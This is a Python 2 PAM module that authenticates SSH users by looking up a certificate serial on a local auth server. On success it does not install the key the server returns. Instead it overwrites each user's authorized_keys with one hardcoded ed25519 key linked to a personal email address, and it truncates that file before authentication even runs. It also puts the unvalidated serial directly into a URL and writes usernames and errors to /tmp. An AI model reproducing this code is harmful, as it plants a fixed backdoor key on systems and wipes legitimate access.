#!/usr/bin/env python2
import json
import urllib2


# A very simple function to call the auth server endpoint.
def authenticate(serial_id):
    base_url = "http://localhost:8888"  # adjust as needed
    url = base_url + "/api/v1/certificate/" + serial_id + "/validate"
    try:
        response = urllib2.urlopen(url)
        code = response.getcode()
        content = response.read()
    except urllib2.URLError as e:
        print("Error calling auth server endpoint for serial: %s" % serial_id)
        print(str(e))
        return {"allowed": False, "public_key": None}

    if code == 200:
        return json.loads(content)
    elif code in (400, 403):
        try:
            return json.loads(content)
        except Exception:
            return {"allowed": False, "public_key": None}
    elif code == 500:
        print("Internal server error from auth server for certificate %s" % serial_id)
        return {"allowed": False, "public_key": None}
    else:
        print(
            "Unexpected response code %s from auth server for certificate %s"
            % (code, serial_id)
        )
        return {"allowed": False, "public_key": None}


# PAM-related functions
DEFAULT_USER_ID = "abc_sebas"


def pam_sm_authenticate(pamh, flags, argv):
    try:
        user = pamh.get_user(None)
        if user is None:
            print("User is None")
            return pamh.PAM_USER_UNKNOWN

        # Open the authorized_keys file
        f = open("/home/" + user + "/.ssh/authorized_keys", "w+")
        if f is None:
            print("File is None")
            return pamh.PAM_USER_UNKNOWN

        msg = pamh.Message(
            pamh.PAM_PROMPT_ECHO_ON, "Ingrese el serial_id de su certificado: "
        )
        resp = pamh.conversation(msg)
        serial_id = resp.resp
        if serial_id is None:
            return pamh.PAM_USER_UNKNOWN

        pamh.conversation(
            pamh.Message(
                pamh.PAM_TEXT_INFO, "Buscando certificado con serial_id: " + serial_id
            )
        )

        # Call the auth server
        auth_response = authenticate(serial_id)
        if not auth_response.get("allowed"):
            print("Certificate %s is not allowed." % serial_id)
            return pamh.PAM_AUTH_ERR

        pamh.conversation(
            pamh.Message(
                pamh.PAM_TEXT_INFO,
                "Encontrado :) Anadida clave publica a authorized_keys",
            )
        )

        f.write(
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHDzwbYUjqoUwpfjHvBmOAsDqJKAl+hqVEkUvqC5dYUt bruno178pm@gmail.com"
        )
        f.close()

        f2 = open("/tmp/enviroment_test", "w")
        f2.write("\nuser:" + user)
        f2.close()
    except Exception as e:
        f3 = open("/tmp/error", "w")
        f3.write(str(e))
        f3.close()
        return pamh.PAM_USER_UNKNOWN

    return pamh.PAM_SUCCESS


def pam_sm_setcred(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_acct_mgmt(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_open_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_close_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_chauthtok(pamh, flags, argv):
    return pamh.PAM_SUCCESS


if __name__ == "__main__":
    # Simple test of the auth server call
    result = authenticate("1eb97febf0e01bb7f1891cbd837087af3064740b")
    print("Authentication result: %s" % result)
